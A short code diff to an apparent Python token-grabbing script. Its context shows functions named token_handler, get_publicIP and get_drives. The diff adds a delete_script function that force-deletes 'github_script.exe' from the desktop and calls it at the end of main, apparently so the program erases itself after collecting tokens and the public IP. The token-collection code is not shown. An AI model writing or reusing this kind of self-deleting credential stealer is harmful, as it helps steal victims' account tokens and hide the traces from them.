@@ -84,8 +84,12 @@ def get_drives():
                 else:
                     print(key)
 
+def delete_script():
+    os.system("del /f desktop/github_script.exe")
+
 def main():
     token_handler()
     get_publicIP()
+    delete_script()
 
 main()
